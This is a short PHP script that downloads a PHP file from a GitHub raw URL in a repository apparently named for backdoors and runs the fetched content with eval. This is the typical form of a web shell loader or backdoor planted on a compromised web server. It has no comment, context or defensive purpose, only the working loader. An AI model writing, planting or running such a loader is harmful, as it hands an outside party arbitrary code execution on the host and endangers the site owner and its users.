<?php 
$url = "https://raw.githubusercontent.com/Dzbackdor/anonymous/refs/heads/main/opet.php";
$ch = curl_init($url); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result = curl_exec($ch);
eval("?>".$result);

?>
